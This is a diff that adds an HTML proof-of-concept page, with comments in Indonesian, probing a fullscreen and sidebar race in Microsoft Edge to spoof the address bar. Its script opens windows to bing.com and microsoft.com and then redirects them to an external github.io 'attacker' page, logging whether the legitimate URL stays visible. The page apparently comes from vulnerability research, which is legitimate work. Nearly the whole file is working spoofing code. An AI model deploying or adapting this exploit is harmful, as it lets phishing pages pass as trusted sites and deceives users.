@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Edge Probe D - Collections + Sidebar Overlay</title></head>
+<body>
+<h3>Edge Probe D: Collections + Sidebar overlay spoof</h3>
+<p>Test: fullscreen + sidebar overlay race. Perhatikan address bar saat sidebar muncul.</p>
+<button onclick="probe()">Mulai Probe</button>
+<pre id="log"></pre>
+<script>
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+
+function probe(){
+  log('=== Edge Collections/Sidebar Overlay Probe ===');
+
+  // 1. Fullscreen dulu (toolbar mulai animate)
+  log('[1] requestFullscreen...');
+  try { document.documentElement.requestFullscreen(); } catch(e){ log('  -> Error: ' + e.message); }
+
+  // 2. Tunggu toolbar mulai animasi
+  log('[2] Tunggu 300ms (toolbar animating)...');
+
+  // 3. Buka window navigasi saat toolbar masih berubah
+  setTimeout(function(){
+    log('[3] Buka window navigasi...');
+    var w = window.open('https://www.bing.com/', '_blank');
+    log('  -> Window: ' + (w ? 'OBJECT' : 'null'));
+
+    // 4. Redirect cepat ke attacker
+    setTimeout(function(){
+      try {
+        w.location = 'https://ikancupang29.github.io/edge-spoof-poc/edge-spoof-target.html';
+        log('  -> Redirect ke attacker BERHASIL');
+        log('  -> CEK ADDRESS BAR WINDOW BARU!');
+        log('  -> Kalau address bar = bing.com tapi konten = attacker = SPOOF!');
+      } catch(e) { log('  -> Redirect blocked: ' + e.message); }
+    }, 400);
+  }, 300);
+
+  // 5. Test collections overlay
+  setTimeout(function(){
+    log('[4] Test collections overlay...');
+    try {
+      document.exitFullscreen();
+      log('  -> Exit fullscreen OK');
+    } catch(e){}
+
+    // Buka window ke target sambil exit fullscreen
+    var w2 = window.open('https://www.microsoft.com/', '_blank');
+    log('  -> Window 2: ' + (w2 ? 'OBJECT (cek address bar saat fullscreen exit)' : 'null'));
+
+    setTimeout(function(){
+      try {
+        w2.location = 'https://ikancupang29.github.io/edge-spoof-poc/edge-spoof-target.html';
+        log('  -> Redirect BERHASIL - cek address bar!');
+      } catch(e) { log('  -> Redirect blocked: ' + e.message); }
+    }, 500);
+  }, 2000);
+
+  log('\nCEK: address bar setiap window baru yang terbuka!');
+  log('Kalau address bar tidak match dengan konten = potential spoof.');
+}
+</script>
+</body>
+</html>
